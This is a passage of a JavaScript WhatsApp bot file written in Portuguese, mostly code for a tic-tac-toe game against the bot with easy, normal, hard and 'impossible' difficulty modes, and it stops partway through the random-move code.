// Bot criado por junhin, altere a scrpit com cuidado para o não causar erros



//--Whatsapp Conneção

const {

   WAConnection,

  MessageType,

  Presence,

  Mimetype,

  GroupSettingChange,

  MessageOptions,
 
  WALocationMessage,

  WA_MESSAGE_STUB_TYPES,

  ReconnectMode,

  ProxyAgent,

  waChatKey,

  mentionedJid,

  processTime,

  ChatModification,

} = require('@adiwajshing/baileys');

//--File js

const {color, bgcolor} = require('./lib/color');

const {belle} = require('./src/belle');

const { aluguel } = require('./src/aluguel');

const {wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, clos } = require('./lib/functions');

const {fetchJson} = require('./lib/fetcher');

const {recognize} = require('./lib/ocr');

const { crtt } = "Jogo da velha"

const { ptbr } = require('./mess')
const { addTTTId, addTTTwin, addTTTdefeat, addTTTtie, addTTTpoints, getTTTId, getTTTwins, getTTTdefeats, getTTTties, getTTTpoints } = require('./lib/tictactoe.js');
//-- inicio jogo da velha

const { ttthelp } = require('./jdv/ttt/TTTconfig/ttthelp');
const { tttme } = require('./jdv/ttt/TTTconfig/tttme');
var tttset = require('./jdv/ttt/TTTconfig/tttset.json');
var esp = require('./jdv/ttt/TTTconfig/tttframe.json');

//_TESTE PARA VITÓRIA DE ❌
const WinnerX = () => {
	if (
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="❌") || (esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="❌") || (esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="❌") || 
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="❌") || (esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="❌") || (esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="❌") || (esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="❌")
	) {
		return true
	} else {
		return false
	}
}

//TESTE PARA VITÓRIA DE ⭕
const WinnerO = () => {
	if (
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="⭕") || (esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="⭕") || (esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="⭕") || 
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="⭕") || (esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="⭕") || (esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="⭕") || (esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="⭕")
	) {
		return true
	} else {
		return false
	}
}

//TESTE PARA EMPATE
const Tie = () => {
	if (esp.a1!="🔲"&&esp.a2!="🔲"&&esp.a3!="🔲"&&esp.b1!="🔲"&&esp.b2!="🔲"&&esp.b3!="🔲"&&esp.c1!="🔲"&&esp.c2!="🔲"&&esp.c3!="🔲") {
		return true
	} else {
		return false
	}
}

const IA = () => {
    if (WinnerX() || WinnerO() || Tie()) {
		tttset.reActivate1 = "off"
//INICIO DO MODO IMPOSSIVEL
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		tttset.reActivate1 = "off"
		IAmove1()
	//JOGADAS PROGRAMADAS ABAIXO
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
     	  tttset.reActivate1 = "off"
          esp.a1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.a2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.a3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.b1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.b2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.b3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.c1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕"))) {
          tttset.reActivate1 = "off"
          esp.c2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
		    ((esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.c3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" && (esp.a1 ==  "🔲" || esp.a3 ==  "🔲" || esp.b2 ==  "🔲" || esp.c1 ==  "🔲" || esp.c3 ==  "🔲")) {
		//PRIORIZAR CANTOS E CENTRO
		tttset.reActivate1 = "off"
		while (tttset.reActivate3 == "on") {
			priorityC()
		}
		tttset.reActivate3 = "on"
//FIM DO MODO IMPOSSIVEL
	} else if (tttset.tttdifficulty == "HARD" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		//HARD
		tttset.reActivate1 = "off"
		IAmove1()
	} else if (tttset.tttdifficulty == "NORMAL" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		//NORMAL
		tttset.reActivate1 = "off"
		let randomNORMAL = Math.floor(Math.random() * 3)
		if (randomNORMAL == 0 || randomNORMAL == 1) {
			IAmove1()
		} else {
			while (tttset.reActivate2 == "on") {
				IAalter()
			}
		}
		tttset.reActivate2 = "on"
	} else {
		//EASY / RANDOM
		let randomALL = Math.floor(Math.random() * 9)
		switch (randomALL) {
			case 0:
				if (esp.a1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a1 = "⭕"
    	        }
    	    break
			case 1:
				if (esp.a2 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a2 = "⭕"
    	        }
    	    break
			case 2:
				if (esp.a3 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a3 = "⭕"
    	        }
    	    break
			case 3:
				if (esp.b1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b1 = "⭕"
    	        }
    	    break
			case 4:
				if (esp.b2 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b2 = "⭕"
    	        }
    	    break
			case 5:
				if (esp.b3 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b3 = "⭕"
    	        }
    	    break
			case 6:
				if (esp.c1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.c1 = "⭕"
    	        }
    	    break
			case 7:
				if (esp.c2 == "🔲") {
    	            tttset.reActivate1 = "off"
